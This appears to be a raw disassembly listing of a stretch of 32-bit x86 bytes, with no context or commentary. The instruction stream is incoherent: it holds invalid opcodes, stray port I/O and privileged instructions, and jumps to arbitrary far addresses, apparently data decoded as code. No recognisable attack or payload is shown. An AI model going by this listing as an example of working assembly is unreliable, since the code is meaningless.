  424f98:	pop    esi
  424f99:	fwait
  424f9a:	adc    BYTE PTR [esi],ah
  424f9c:	inc    esi
  424f9d:	fisttp QWORD PTR [edi-0x429f7696]
  424fa3:	xor    BYTE PTR [eax],dl
  424fa5:	mov    ecx,0x2e3f7d0a
  424faa:	mov    dl,0x7e
  424fac:	cli    
  424fad:	pop    ebp
  424fae:	xchg   ecx,eax
  424faf:	(bad)  
  424fb0:	pop    eax
  424fb1:	add    DWORD PTR [eax+eax*4-0x5ed31ec2],edi
  424fb8:	pop    ecx
  424fb9:	adc    eax,0xbd9a6dd
  424fbe:	push   ds
  424fbf:	lahf   
  424fc0:	pop    esi
  424fc1:	leave  
  424fc2:	lar    ecx,WORD PTR es:[edx+0x4d966bc5]
  424fca:	fsubr  st,st(4)
  424fcc:	xor    ah,bh
  424fce:	out    dx,al
  424fcf:	mov    esi,0xf1d63e66
  424fd4:	adc    al,0x61
  424fd6:	or     eax,0x4365eb43
  424fdb:	adc    DWORD PTR [ecx+0x11e5ee5e],edi
  424fe1:	imul   edi,esp,0x7
  424fe4:	in     eax,0xc7
  424fe6:	aad    0xa0
  424fe8:	call   0x445a:0xe225092f
  424fef:	jmp    0x42504e
  424ff1:	jmp    0x3027:0x2d957aa2
  424ff8:	xchg   esi,eax
  424ff9:	add    BYTE PTR [ebx],ch
  424ffb:	mov    eax,ds:0xb7abbab8
  425000:	mov    eax,ds:0xb396c980
  425005:	xor    BYTE PTR [edx-0x5c],dl
  425008:	add    eax,0x1562287f
  42500d:	imul   esp,DWORD PTR [esi+0x6c],0x7cee371c
  425014:	or     ah,BYTE PTR [edx+0x4c375543]
  42501a:	push   esp
  42501b:	mov    eax,ds:0x650a00a5
  425020:	aas    
  425021:	mov    ?,esi
  425023:	inc    ebx
  425024:	pop    esi
  425025:	push   0x639c25be
  42502a:	adc    eax,0xa35e1b64
  42502f:	mov    ds:0xfbab47fa,al
  425034:	pop    edi
  425035:	jns    0x425077
  425037:	mov    cx,0xda9e
  42503b:	adc    BYTE PTR [ebp-0x2f832fe9],cl
  425041:	pusha  
  425042:	dec    eax
  425043:	add    DWORD PTR [ecx+ebp*2+0x26],esi
  425047:	sbb    ebx,DWORD PTR [eax]
  425049:	pmaxsw mm7,QWORD PTR [ebx+0x39]
  42504d:	loopne 0x425057
  42504f:	pusha  
  425050:	jmp    0x1fab:0x3480f8aa
  425057:	mov    eax,ds:0xd504be23
  42505c:	sbb    dl,BYTE PTR [edi-0x9]
  42505f:	ficomp DWORD PTR [esi+0x7f]
  425062:	dec    esp
  425063:	pop    ss
  425064:	sbb    dh,bl
  425066:	mov    eax,ds:0x756083a9
  42506b:	cmp    eax,0xebe6c5f3
  425070:	or     al,al
  425072:	out    dx,al
  425073:	pop    ebx
  425074:	les    edx,FWORD PTR [ebp+0xd]
  425077:	js     0x425028
  425079:	pop    esi
  42507a:	mov    dl,0xa0
  42507c:	add    BYTE PTR ds:[ebp-0x2d0dcdb4],al
  425083:	aam    0x5e
  425085:	clc    
  425086:	dec    eax
  425087:	lock pop ecx
  425089:	mov    ds:0x5fc125eb,al
  42508e:	jp     0x425063
  425090:	data16 loop 0x4250ad
  425093:	xlat   BYTE PTR gs:[ebx]
  425095:	pop    ds
  425096:	inc    esp
  425097:	pushf  
  425098:	shl    BYTE PTR [eax-0x18eb98af],0x96
  42509f:	xchg   DWORD PTR [esi-0xd],ebx
  4250a2:	inc    esi
  4250a3:	inc    edx
  4250a4:	fcmovbe st,st(1)
  4250a6:	mov    bl,0x23
  4250a8:	xchg   BYTE PTR [edx],bl
  4250aa:	out    0x83,eax
  4250ac:	or     dh,BYTE PTR [eax+0x246ecc0a]
  4250b2:	dec    esp
  4250b3:	pop    esi
  4250b4:	sbb    DWORD PTR [ecx+0xf],esp
  4250b7:	adc    esi,esp
  4250b9:	sub    DWORD PTR [edi],0xeee9a4e7
  4250bf:	and    BYTE PTR [esi+0x1aae022c],bh
  4250c5:	test   ebx,ecx
  4250c7:	mov    al,ds:0xb9c12a2a
  4250cc:	ret    
  4250cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250ce:	mov    ah,0xb2
  4250d0:	fs pop esp
  4250d2:	out    0xd,eax
  4250d4:	jno    0x4250f6
  4250d6:	das    
  4250d7:	jle    0x425063
  4250d9:	test   DWORD PTR [ebp-0x66],edx
  4250dc:	xchg   esp,eax
  4250dd:	dec    eax
  4250de:	pop    ecx
  4250df:	push   edi
  4250e0:	fmulp  st(0),st
  4250e2:	ins    BYTE PTR es:[edi],dx
  4250e3:	je     0x42515e
  4250e5:	aad    0xee
  4250e7:	jb     0x425079
  4250e9:	lea    ebp,[edx+0x38]
  4250ec:	in     al,dx
  4250ed:	adc    ebp,DWORD PTR [edi+0x33191297]
  4250f3:	(bad)  
  4250f4:	out    dx,al
  4250f5:	mov    al,gs:0xee3d22af
  4250fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4250fc:	or     ebx,ebx
  4250fe:	loope  0x42512d
  425100:	outs   dx,BYTE PTR ds:[esi]
  425101:	jl     0x4250f1
  425103:	lock lds edx,FWORD PTR ss:[edi]
  425107:	xor    DWORD PTR [edx],ebx
  425109:	pop    esi
  42510a:	sbb    DWORD PTR [ecx+0x6fb76420],esp
  425110:	sub    BYTE PTR [ebp+0x22eb5d70],al
  425116:	out    0xf2,eax
  425118:	retf   
  425119:	inc    ebp
  42511a:	cdq    
  42511b:	sbb    ch,BYTE PTR [esi-0xe]
  42511e:	sbb    edi,DWORD PTR fs:[edx]
  425121:	fs popa 
  425123:	rcr    dh,1
  425125:	aaa    
  425126:	push   0xffffff88
  425128:	iret   
  425129:	or     BYTE PTR [edi],bl
  42512b:	pop    si
  42512d:	sub    edi,esp
  42512f:	jnp    0x4251ad
  425131:	jb     0x42513b
  425133:	push   cs
  425134:	out    dx,al
  425135:	push   esp
  425136:	jbe    0x42513e
  425138:	aad    0x2
  42513a:	pop    eax
  42513b:	aaa    
  42513c:	pop    edi
  42513d:	push   ebp
  42513e:	fnsave [ecx+0x4142a777]
  425144:	int3   
  425145:	adc    cl,BYTE PTR [eax]
  425147:	test   al,0x32
  425149:	out    dx,eax
  42514a:	push   edx
  42514b:	mov    al,BYTE PTR [edi+0x41]
  42514e:	mov    eax,0x50cc4fa4
  425153:	pop    ebx
  425154:	pop    edi
  425155:	enter  0x5bca,0xe4
  425159:	mov    eax,ds:0xe79728ad
  42515e:	in     al,0xa0
  425160:	sub    al,0x67
  425162:	adc    esi,DWORD PTR [ecx]
  425164:	push   ds
  425165:	rcr    DWORD PTR ds:0xee9f6ecb,1
  42516b:	push   esi
  42516c:	out    0x64,al
  42516e:	nop
  42516f:	scas   al,BYTE PTR es:[edi]
  425170:	xchg   esi,eax
  425171:	or     edx,DWORD PTR [ebx+0x57614a69]
  425177:	ins    DWORD PTR es:[edi],dx
  425178:	sub    DWORD PTR ds:0x2658ddf9,ebp
  42517e:	out    dx,al
  42517f:	inc    edi
  425180:	cmp    cl,BYTE PTR [ecx]
  425182:	mov    al,0xb8
  425184:	ss jnp 0x425181
  425187:	mov    al,ds:0xa57d098b
  42518c:	pop    ds
  42518d:	mov    ds:0xeb705185,eax
  425192:	or     bl,dh
  425194:	sbb    bh,BYTE PTR [eax+0x1f3edeb]
  42519a:	fimul  DWORD PTR [eax+0x6]
  42519d:	or     edi,DWORD PTR [edx]
  42519f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251a0:	cmp    DWORD PTR [edx],0xa1359404
  4251a6:	inc    ecx
  4251a7:	push   edi
  4251a8:	test   BYTE PTR [ecx],bh
  4251aa:	out    dx,al
  4251ab:	and    al,0xdb
  4251ad:	push   0xc698460d
  4251b2:	push   ds
  4251b3:	mov    eax,ds:0x4a3d778e
  4251b8:	test   al,0x50
  4251ba:	xchg   esp,eax
  4251bb:	xor    eax,0xdab3f55e
  4251c0:	xlat   BYTE PTR ds:[ebx]
  4251c1:	adc    DWORD PTR [esi+0x275a3cd5],0xfa7711f5
  4251cb:	add    DWORD PTR [ebx+0x79],edi
  4251ce:	add    al,BYTE PTR [ecx+0xff0357d]
  4251d4:	aam    0x85
  4251d6:	or     eax,DWORD PTR [ecx]
  4251d8:	xor    DWORD PTR [eax+0x9],ebp
  4251db:	mov    esp,DWORD PTR [ebx+0x5a]
  4251de:	mov    esp,0xc82d1a2c
  4251e3:	shl    BYTE PTR [eax],0xcc
  4251e6:	jg     0x4251d1
  4251e8:	push   ebx
  4251e9:	xchg   edx,eax
  4251ea:	sbb    DWORD PTR [edi+0x13],edi
  4251ed:	into   
  4251ee:	lods   eax,DWORD PTR ds:[esi]
  4251ef:	(bad)  
  4251f0:	call   0x8797:0x969ac788
  4251f7:	mov    eax,ds:0x50a3d3c9
  4251fc:	call   DWORD PTR [esi+0x6852e62d]
  425202:	loopne 0x425191
  425204:	pop    esi
  425205:	cmp    DWORD PTR [ebx],ebx
  425207:	inc    ecx
  425208:	inc    edi
  425209:	jecxz  0x4251d3
  42520b:	mov    al,ds:0x77d153b1
  425210:	mov    ds:0x5eb96e50,al
  425215:	jle    0x425282
  425217:	push   ecx
  425218:	push   edi
  425219:	ffree  st(5)
  42521b:	(bad)  
  42521c:	in     al,0x2f
  42521e:	push   es
  42521f:	mov    eax,ds:0xee4110c8
  425224:	int3   
  425225:	outs   dx,BYTE PTR ds:[esi]
  425226:	cmp    eax,0x58a5eac
  42522b:	and    al,0xfe
  42522d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42522e:	cmp    BYTE PTR [ecx-0x3d],al
  425231:	pusha  
  425232:	mov    al,ds:0xdafbb18b
  425237:	pop    ss
  425238:	pop    ebp
  425239:	adc    cl,BYTE PTR [edi+eax*4-0xc]
  42523d:	inc    ecx
  42523e:	fs xchg esi,eax
  425240:	push   ebx
  425241:	pop    edx
  425242:	jmp    0x596130c5
  425247:	stc    
  425248:	xor    DWORD PTR [edx+0x28],esi
  42524b:	mov    eax,ds:0x533a4717
  425250:	add    DWORD PTR [esi+0x70],ebp
  425253:	repz pop esi
  425255:	sbb    ebp,ebp
  425257:	imul   esi,DWORD PTR [ebx+0x69bc6aad],0x60
  42525e:	lods   eax,DWORD PTR ds:[esi]
  42525f:	jbe    0x4251fe
  425261:	push   esi
  425262:	int3   
  425263:	push   ebx
  425264:	sub    BYTE PTR [ecx+0x2e3c2bee],dh
  42526a:	xchg   DWORD PTR [esi-0x5c1b9b28],esi
  425270:	mov    dl,0x7
  425272:	dec    edx
  425273:	mov    al,ds:0xf9762ffb
  425278:	out    0xc4,al
  42527a:	fidiv  WORD PTR [ebp+0x60]
  42527d:	call   0x8166:0x9600506f
  425284:	in     al,0x66
  425286:	fldcw  WORD PTR [esi-0x5e]
  425289:	scas   al,BYTE PTR es:[edi]
  42528a:	sbb    eax,0x160e5ea
  42528f:	adc    BYTE PTR [ebp+0x66],bl
  425292:	xor    cl,cl
  425294:	dec    ecx
  425295:	call   0xfea59088
  42529a:	stos   DWORD PTR es:[edi],eax
  42529b:	pop    ecx
  42529c:	jae    0x42523c
  42529e:	pushf  
  42529f:	mov    eax,ds:0xb4aaa8dd
  4252a4:	sbb    al,0xd1
  4252a6:	test   BYTE PTR [edx+0x3eec90ff],bh
  4252ac:	(bad)  
  4252ad:	loopne 0x425283
  4252af:	out    dx,al
  4252b0:	or     al,0x61
  4252b2:	mov    DWORD PTR [esi+0x1761a137],edx
  4252b8:	xchg   bl,dl
  4252ba:	out    dx,al
  4252bb:	test   al,0xa8
  4252bd:	push   ds
  4252be:	retf   
  4252bf:	push   edi
  4252c0:	pop    ebp
  4252c1:	pushf  
  4252c2:	stos   DWORD PTR es:[edi],eax
  4252c3:	ins    BYTE PTR es:[edi],dx
  4252c4:	wrmsr  
  4252c6:	jge    0x425269
  4252c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252c9:	pop    ecx
  4252ca:	stc    
  4252cb:	sub    al,0x92
  4252cd:	sahf   
  4252ce:	(bad)  [ecx+0x5e]
  4252d1:	mov    DWORD PTR [ebx-0xb],edi
  4252d4:	div    DWORD PTR [eax]
  4252d6:	fwait
  4252d7:	dec    esi
  4252d8:	pop    ss
  4252d9:	popa   
  4252da:	lods   al,BYTE PTR ds:[esi]
  4252db:	arpl   WORD PTR [edx-0x7],cx
  4252de:	jns    0x42526b
  4252e0:	jb     0x42531d
  4252e2:	in     eax,dx
  4252e3:	push   esi
  4252e4:	inc    ebp
  4252e5:	out    0x20,al
  4252e7:	dec    edi
  4252e8:	add    edx,DWORD PTR [ebp+0x66]
  4252eb:	xchg   esi,eax
  4252ec:	sbb    eax,0xc4fe5961
  4252f1:	dec    edi
  4252f2:	inc    ecx
  4252f3:	cmp    eax,0xf5ee8559
  4252f8:	fsubr  DWORD PTR [edi-0x26]
  4252fb:	mov    bl,0x5d
  4252fd:	sbb    ah,BYTE PTR [esi-0x55]
  425300:	jmp    0x425329
  425302:	out    dx,al
  425303:	vunpcklpd xmm7,xmm1,XMMWORD PTR [ebx+esi*2]
  425308:	sbb    edi,edx
  42530a:	cmc    
  42530b:	ror    BYTE PTR [ebx-0x7b],1
  42530e:	nop
  42530f:	mov    ds:0x18673f57,al
  425314:	push   0xfffffff8
  425316:	fbld   TBYTE PTR [eax+0x261b5135]
  42531c:	mov    edi,0x5eaff657
  425321:	call   0x10f1192c
  425326:	popf   
  425327:	xchg   ebx,eax
  425328:	mov    esi,0xdca0cba8
  42532d:	jns    0x4252db
  42532f:	push   ecx
  425330:	jge    0x4252b8
  425332:	fisttp WORD PTR [edi]
  425334:	pop    esi
  425335:	push   ss
  425336:	mov    al,0xb3
  425338:	out    0xe1,al
  42533a:	and    al,0x4d
  42533c:	fs popa 
  42533e:	push   0xffffffed
  425340:	bndstx [eax-0x3a],(bad)
  425344:	mov    dh,0x48
  425346:	out    dx,al
  425347:	gs ret 
  425349:	or     BYTE PTR [esi+edi*4-0x79],ah
  42534d:	lea    edi,ds:0x7bbe38ad
  425353:	rcr    DWORD PTR [esi-0x446467af],cl
  425359:	xor    eax,DWORD PTR [ebp-0x4f]
  42535c:	cmc    
  42535d:	ret    0x382c
  425360:	pop    edi
  425361:	fs inc eax
  425363:	xchg   ecx,eax
  425364:	scas   al,BYTE PTR es:[edi]
  425365:	mov    dl,0x3a
  425367:	sub    DWORD PTR [esi+0x73],0x2c2ea0e3
  42536e:	push   ss
  42536f:	rol    BYTE PTR [ebx+0x46],cl
  425372:	lahf   
  425373:	push   edi
  425374:	pop    edi
  425375:	xchg   esi,eax
  425376:	pop    ss
  425377:	xor    al,0xc9
  425379:	fnstsw WORD PTR [ebx]
  42537b:	js     0x4253db
  42537d:	push   edx
  42537e:	mov    dh,0x4a
  425380:	and    BYTE PTR [eax-0x15],0x3d
  425384:	mov    cl,0x41
  425386:	mov    eax,0xedeea509
  42538b:	adc    al,0x76
  42538d:	sbb    al,BYTE PTR [ecx]
  42538f:	cmp    al,0x66
  425391:	xchg   esp,eax
  425392:	inc    esi
  425393:	aas    
  425394:	cmp    ah,BYTE PTR [ecx-0x29]
  425397:	fdiv   QWORD PTR [ecx]
  425399:	inc    ebp
  42539a:	jno    0x425392
  42539c:	retf   
  42539d:	sbb    al,0x4c
  42539f:	shl    BYTE PTR [ebp+0x42],0x9d
  4253a3:	jle    0x425405
  4253a5:	popa   
  4253a6:	lea    esi,[edx-0x29]
  4253a9:	adc    al,cl
  4253ab:	mov    ds:0x65b40f49,eax
  4253b0:	jge    0x4253bc
  4253b2:	pop    esi
  4253b3:	dec    edi
  4253b4:	mov    al,0xcb
  4253b6:	loop   0x42536f
  4253b8:	pop    esi
  4253b9:	dec    esi
  4253ba:	int    0x5f
  4253bc:	retfw  0x57b9
  4253c0:	aad    0x63
  4253c2:	add    BYTE PTR [edi+0xb06d1de],dl
  4253c8:	pop    ds
  4253c9:	icebp  
  4253ca:	(bad)  
  4253cb:	jg     0x425445
  4253cd:	hlt    
  4253ce:	add    DWORD PTR [esi-0x70],ebx
  4253d1:	sub    DWORD PTR ds:0x1601b5c5,0x26
  4253d8:	imul   esi,DWORD PTR [eax+0x61630b1f],0x8
  4253df:	adc    eax,0xe707a882
  4253e4:	or     ebx,DWORD PTR [edi+0x26083bee]
  4253ea:	pop    eax
  4253eb:	rol    DWORD PTR [ecx-0x4f5822f9],cl
  4253f1:	mov    ds:0xf094f9f1,eax
  4253f6:	sbb    esi,DWORD PTR [ebx+0xa]
  4253f9:	pusha  
  4253fa:	lock sbb DWORD PTR [ebp-0x2ab7ef6d],ecx
  425401:	cdq    
  425402:	out    dx,al
  425403:	mov    ch,0x2b
  425405:	cmc    
  425406:	repnz mov ds:0xca9cad63,eax
  42540c:	popf   
  42540d:	fist   WORD PTR [ecx+0x61]
  425410:	in     eax,dx
  425411:	fldcw  WORD PTR [ecx]
  425413:	fcomp  QWORD PTR [esi-0x6]
  425416:	nop
  425417:	rcl    DWORD PTR [edi-0x2e1275be],1
  42541d:	sub    al,0xc8
  42541f:	mov    al,ds:0x2732ffe0
  425424:	test   al,0x23
  425426:	push   edi
  425427:	retf   0x375e
  42542a:	stos   DWORD PTR es:[edi],eax
  42542b:	nop
  42542c:	xor    ecx,edx
  42542e:	xchg   ecx,eax
  42542f:	jecxz  0x4253f6
  425431:	jl     0x425476
  425433:	mov    ds:0x2dee6713,eax
  425438:	lahf   
  425439:	mov    esi,0x2a1be03d
  42543e:	dec    esp
  42543f:	mov    al,0x5e
  425441:	ds leave 
  425443:	fst    DWORD PTR ds:0xc1245baf
  425449:	pusha  
  42544a:	mov    ds:0xa05fea6,al
  42544f:	inc    esi
  425450:	jg     0x425496
  425452:	out    dx,al
  425453:	cld    
  425454:	xor    ecx,0x9c2d9a38
  42545a:	in     al,0xa0
  42545c:	scas   eax,DWORD PTR es:[edi]
  42545d:	fild   QWORD PTR [edx+0x3d]
  425460:	cmp    al,0x1a
  425462:	sbb    BYTE PTR [ecx-0x12378a9c],bh
  425468:	and    BYTE PTR [eax],0xce
  42546b:	adc    al,0xde
  42546d:	pop    ebp
  42546e:	push   esp
  42546f:	mov    eax,ds:0xbd617a9
  425474:	inc    ecx
  425475:	repz cmp BYTE PTR [ebx+0x5e],dh
  425479:	mov    ds:0xa2290db4,eax
  42547e:	push   edx
  42547f:	mov    ebx,DWORD PTR [ecx-0x135268bd]
  425485:	and    BYTE PTR [eax+edx*2-0x32],dl
  425489:	outs   dx,BYTE PTR ds:[esi]
  42548a:	jno    0x4254a1
  42548c:	pop    esi
  42548d:	mov    cl,0x8d
  42548f:	or     eax,ebx
  425491:	fadd   DWORD PTR [ecx-0x3e]
  425494:	and    ah,BYTE PTR [ebx+esi*2-0x4a]
  425498:	pop    esi
  425499:	or     BYTE PTR [edx+0x5c],al
  42549c:	imul   BYTE PTR [edx+eax*8-0x114b8bdb]
  4254a3:	xor    eax,0x3e1ea975
  4254a8:	fidiv  WORD PTR [edx-0x76c15f18]
  4254ae:	sar    DWORD PTR [ecx+0xe],1
  4254b1:	mov    cl,0xc2
  4254b3:	jmp    0x425513
  4254b5:	adc    al,0xdb
  4254b7:	data16 icebp 
  4254b9:	hlt    
  4254ba:	rcl    BYTE PTR [edx+0x7ead6119],cl
  4254c0:	(bad)  
  4254c1:	in     al,dx
  4254c2:	xchg   edi,eax
  4254c3:	inc    ebx
  4254c4:	bound  ebp,QWORD PTR ds:0xb24c47ee
  4254ca:	xlat   BYTE PTR ds:[ebx]
  4254cb:	ret    
  4254cc:	push   esi
  4254cd:	test   al,0xfa
  4254cf:	(bad)  
  4254d1:	adc    dh,ch
  4254d3:	repnz arpl ax,dx
  4254d6:	or     BYTE PTR [esi-0xe4aa15f],al
  4254dc:	repz pusha 
  4254de:	repz ja 0x425478
  4254e1:	inc    eax
  4254e2:	fld    DWORD PTR [edi-0x71]
  4254e5:	pop    esp
  4254e6:	ss inc ebp
  4254e8:	sbb    al,0x17
  4254ea:	cdq    
  4254eb:	and    eax,ebp
  4254ed:	push   es
  4254ee:	mov    WORD PTR [eax],gs
  4254f0:	mov    bh,BYTE PTR [di]
  4254f3:	sub    ebx,DWORD PTR [ebx]
  4254f5:	pop    edx
  4254f6:	ins    BYTE PTR es:[edi],dx
  4254f7:	pop    edx
  4254f8:	mov    esi,0x150a052b
  4254fd:	pop    edx
  4254fe:	or     eax,0xac088f14
  425503:	push   eax
  425504:	jge    0x4254fb
  425506:	mov    esp,0x6ec75efe
  42550b:	pop    esi
  42550c:	jb     0x42557e
  42550e:	mov    BYTE PTR [edx-0x78869edf],bh
  425514:	cdq    
  425515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425516:	stc    
  425517:	push   edi
  425518:	jae    0x42553c
  42551a:	out    dx,al
  42551b:	hlt    
  42551c:	aas    
  42551d:	pop    ebx
  42551e:	cld    
  42551f:	inc    edi
  425520:	ins    DWORD PTR es:[edi],dx
  425521:	sti    
  425522:	pop    edx
  425523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425524:	inc    edx
  425525:	repnz add DWORD PTR gs:[ebp+0x44208d96],ebx
  42552d:	call   0x426c02bc
  425532:	push   edi
  425533:	inc    edi
  425534:	ficomp WORD PTR [edx+0x4b]
  425537:	int    0x3b
  425539:	mov    ?,si
  42553c:	dec    ecx
  42553d:	popa   
  42553e:	and    bl,BYTE PTR [ecx+eax*1+0x33]
  425542:	inc    ecx
  425543:	scas   eax,DWORD PTR es:[edi]
  425544:	(bad)  
  425545:	adc    DWORD PTR [ebx+esi*8+0x5e],edx
  425549:	(bad)  
  42554a:	retf   0x906c
  42554d:	js     0x425518
  42554f:	mov    ds:0x3ccd596d,al
  425554:	rol    BYTE PTR [eax],cl
  425556:	ficomp WORD PTR [edi+0xffc26df]
  42555c:	lahf   
  42555d:	mov    ch,0x2e
  42555f:	neg    ebp
  425561:	pop    ds
  425562:	out    dx,al
  425563:	mov    ebx,0x5d1d7b7a
  425568:	and    BYTE PTR [ebx+0x1ce4a102],0xa7
  42556f:	inc    esp
  425570:	jmp    0x922b:0x5eba75ec
  425577:	stos   DWORD PTR es:[edi],eax
  425578:	(bad)  
  425579:	test   al,0x2a
  42557b:	dec    edx
  42557c:	nop
  42557d:	pusha  
  42557e:	jns    0x425501
  425580:	mov    ecx,0xe6590e06
  425585:	pop    esi
  425586:	out    dx,eax
  425587:	and    BYTE PTR [esp+edi*2+0x6b3d00b9],dh
  42558e:	sbb    eax,0x96a0817c
  425593:	data16 ins BYTE PTR es:[edi],dx
  425595:	and    DWORD PTR [edx],ebx
  425597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425598:	pop    esi
  425599:	jl     0x425568
  42559b:	aas    
  42559c:	sbb    eax,0x942dafa5
  4255a1:	pusha  
  4255a2:	loopne 0x4255f1
  4255a4:	retf   0x7658
  4255a7:	iret   
  4255a8:	push   ss
  4255a9:	imul   ebp,edi,0xae4619c0
  4255af:	add    BYTE PTR [eax-0xe],dl
  4255b2:	(bad)  
  4255b3:	mov    ch,0xe4
  4255b5:	fs jne 0x425556
  4255b8:	ficom  WORD PTR [ebx+ebp*8+0xae0bf78]
  4255bf:	adc    cl,BYTE PTR [eax+0x2698ed0a]
  4255c5:	cmp    edi,DWORD PTR [ebp+0x1ec58fb3]
  4255cb:	push   0xf755af05
  4255d0:	mov    ds:0x3affc260,eax
  4255d5:	xchg   ebx,eax
  4255d6:	lahf   
  4255d7:	(bad)  
  4255d8:	adc    BYTE PTR [ebp-0x10],ch
  4255db:	cdq    
  4255dc:	cmp    eax,0xf9c409dd
  4255e1:	outs   dx,DWORD PTR ds:[esi]
  4255e2:	adc    al,0xa
  4255e4:	popa   
  4255e5:	mov    bh,0x2a
  4255e7:	iret   
  4255e8:	dec    esp
  4255e9:	pop    ebp
  4255ea:	pop    eax
  4255eb:	push   edx
  4255ec:	idiv   bl
  4255ee:	lock pusha 
  4255f0:	and    esi,eax
  4255f2:	cs sub al,0x38
  4255f5:	inc    eax
  4255f6:	xchg   ecx,eax
  4255f7:	mov    eax,ds:0x22246dbb
  4255fc:	hlt    
  4255fd:	inc    esi
  4255fe:	push   edx
  4255ff:	mov    fs,WORD PTR [ecx]
  425601:	lods   al,BYTE PTR ds:[esi]
  425602:	std    
  425603:	dec    edi
  425604:	xchg   edi,eax
  425605:	mov    al,ds:0x2eff41af
  42560a:	loope  0x42567b
  42560c:	pop    esi
  42560d:	jns    0x4255ec
  42560f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425610:	or     al,BYTE PTR [edx+edx*4]
  425613:	aam    0x66
  425615:	rol    esi,1
  425617:	mov    al,ds:0xdeaf1c26
  42561c:	xchg   edi,eax
  42561d:	xchg   DWORD PTR [edi+0x2d6652ae],esi
  425623:	in     al,0x1e
  425625:	jmp    0x5a2ed84b
  42562a:	cmp    BYTE PTR [edx-0x3cfd4c8a],ah
  425630:	cmp    ecx,edx
  425632:	or     DWORD PTR ss:[ebx-0x371ee0dd],0xb6b976e0
  42563d:	lods   al,BYTE PTR ds:[esi]
  42563e:	push   es
  42563f:	in     eax,0x57
  425641:	pop    esi
  425642:	adc    al,BYTE PTR [edi-0x2448c85b]
  425648:	xchg   dl,al
  42564a:	hlt    
  42564b:	dec    ebx
  42564c:	fs push ebp
  42564e:	lods   al,BYTE PTR ds:[esi]
  42564f:	mov    ebp,0xc702e151
  425654:	xchg   edx,eax
  425655:	lahf   
  425656:	cmc    
  425657:	xchg   ebx,eax
  425658:	shl    BYTE PTR [edi-0x67],cl
  42565b:	mov    eax,ds:0xd8d11c62
  425660:	xlat   BYTE PTR ds:[ebx]
  425661:	dec    edi
  425662:	adc    BYTE PTR [eax],bh
  425664:	ss or  eax,0xc2cb32ee
  42566a:	adc    al,0xbc
  42566c:	jnp    0x4256ce
  42566e:	pop    esp
  42566f:	fbstp  TBYTE PTR [edi]
  425671:	push   0x9369a5ae
  425676:	out    dx,al
  425677:	imul   BYTE PTR [eax-0x35]
  42567a:	rol    BYTE PTR [ebx-0x54],cl
  42567d:	shl    BYTE PTR [ecx+0xbdcda1],cl
  425683:	out    0xab,eax
  425685:	pop    eax
  425686:	dec    edx
  425687:	fs pop esi
  425689:	xchg   ebp,eax
  42568a:	loop   0x4256e7
  42568c:	fnstcw WORD PTR [ebx]
  42568e:	mov    ecx,0x8a624af9
  425693:	scas   eax,DWORD PTR es:[edi]
  425694:	pop    esi
  425695:	iret   
  425696:	(bad)  
  425697:	into   
  425698:	inc    ebx
  425699:	sub    DWORD PTR [ebx+0x27815ecb],0x1e
  4256a0:	inc    esi
  4256a1:	call   0xaba215b1
  4256a6:	mov    eax,ds:0xf700a2e0
  4256ac:	sbb    ebp,DWORD PTR [ebx+eax*4+0x844ceed]
  4256b3:	adc    BYTE PTR [ecx],ah
  4256b5:	popf   
  4256b6:	out    dx,al
  4256b7:	shl    DWORD PTR [esi-0x7fc895c],0x60
  4256be:	jno    0x4256dd
  4256c0:	mov    ebx,0x1fe30131
  4256c5:	ins    DWORD PTR es:[edi],dx
  4256c6:	out    dx,al
  4256c7:	pop    edi
  4256c8:	lds    edx,FWORD PTR [esi]
  4256ca:	xlat   BYTE PTR ds:[ebx]
  4256cb:	and    al,0xae
  4256cd:	inc    ecx
  4256ce:	fsub   DWORD PTR [eax-0x52ca1d3f]
  4256d4:	or     dl,cl
  4256d6:	pop    ds
  4256d7:	shl    ch,0xd9
  4256da:	out    dx,al
  4256db:	or     ebp,esi
  4256dd:	adc    BYTE PTR [eax+0x3e1f68],al
  4256e3:	imul   esi,DWORD PTR [eax],0xe4a4a75a
  4256e9:	xchg   ecx,eax
  4256ea:	imul   esp,ecx,0xdb6ce297
  4256f0:	push   0x5db631fe
  4256f5:	jmp    0x4256e5
  4256f7:	daa    
  4256f8:	sar    BYTE PTR [eax],cl
  4256fa:	les    esi,FWORD PTR [esi+eax*2+0x61]
  4256fe:	fisub  DWORD PTR [esi+0x54]
  425701:	out    0xa7,al
  425703:	add    dh,BYTE PTR [ebp-0x20]
  425706:	out    dx,al
  425707:	arpl   ax,si
  425709:	out    0x57,eax
  42570b:	mov    al,ds:0xa1918d5d
  425710:	xchg   BYTE PTR [edx],bh
  425712:	inc    edi
  425713:	lock push cs
  425715:	add    eax,0x78542eb2
  42571a:	je     0x425722
  42571c:	pop    esi
  42571d:	jno    0x425791
  42571f:	out    0x70,al
  425721:	inc    eax
  425722:	js     0x4256c5
  425724:	std    
  425725:	xchg   ebx,eax
  425726:	mov    ds:0xf30f07b7,al
  42572b:	outs   dx,DWORD PTR ds:[esi]
  42572c:	add    BYTE PTR [esi-0x32788113],0x6e
  425733:	mov    ebp,ss
  425735:	push   ecx
  425736:	sbb    eax,0x519d7bcd
  42573b:	mov    eax,ds:0x681beca6
  425740:	jl     0x42570b
  425742:	mov    ds:0x55d65fec,eax
  425747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425748:	dec    ecx
  425749:	stos   BYTE PTR es:[edi],al
  42574a:	ins    BYTE PTR es:[edi],dx
  42574b:	imul   esp,DWORD PTR [edx],0x9ea0fc34
  425751:	not    BYTE PTR [ebx+0x1a9dc571]
  425757:	mov    edi,0x2461965f
  42575c:	int    0x9b
  42575e:	sti    
  42575f:	and    cl,ch
  425761:	xor    al,0xd7
  425763:	sahf   
  425764:	scas   al,BYTE PTR es:[edi]
  425765:	out    0xfe,al
  425767:	sar    esi,1
  425769:	jecxz  0x4257d9
  42576b:	imul   esi,eax,0x5ef56468
  425771:	inc    ecx
  425772:	clc    
  425773:	mov    BYTE PTR [ebp+0x1c01db47],0x52
  42577a:	xor    eax,ecx
  42577c:	xlat   BYTE PTR ds:[ebx]
  42577d:	or     dh,0x59
